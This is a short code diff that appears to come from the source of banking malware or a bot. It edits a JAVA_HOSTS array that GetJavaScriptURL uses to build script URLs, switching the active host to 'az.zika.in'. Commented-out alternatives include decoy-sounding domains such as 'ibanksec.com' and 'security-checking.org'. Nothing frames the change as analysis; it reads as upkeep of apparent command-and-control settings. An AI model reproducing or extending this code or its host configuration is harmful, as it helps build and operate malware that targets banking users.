@@ -17,6 +17,7 @@
 #include "Config.h"
 #include "BotHTTP.h"
 #include "HTTPConsts.h"
+#include "StrConsts.h"
 
 //---------------------------------------------------------------------------
 
@@ -36,7 +37,7 @@
 //							"\0";
 
 //		char JAVA_HOSTS[] = "ibanksec.com\0";
-		char JAVA_HOSTS[] = "az2.zika.in\0";
+		char JAVA_HOSTS[] = "az.zika.in\0";
 //		char JAVA_HOSTS[] = "security-checking.org\0";
 //		char JAVA_HOSTS[] = "192.168.0.250\0";
 
@@ -95,3 +96,6 @@ PCHAR GetJavaScriptURL(PCHAR Path)
 
 	return URL;
 }
+
+
+
